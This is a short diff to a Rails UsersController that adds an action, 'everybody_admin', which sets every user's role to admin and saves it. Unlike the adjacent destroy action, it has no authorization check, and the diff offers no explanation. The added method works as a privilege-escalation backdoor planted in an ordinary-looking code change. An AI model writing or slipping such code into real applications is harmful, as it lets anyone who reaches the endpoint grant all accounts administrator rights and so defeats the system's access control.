@@ -35,6 +35,15 @@ class UsersController < ApplicationController
     end
   end
 
+  def everybody_admin
+    @users = User.all
+    @users.each do |user|
+      user.role = "admin"
+      user.save
+    end
+    render :index
+  end
+
   def destroy
     @users.destroy
     authorize @users
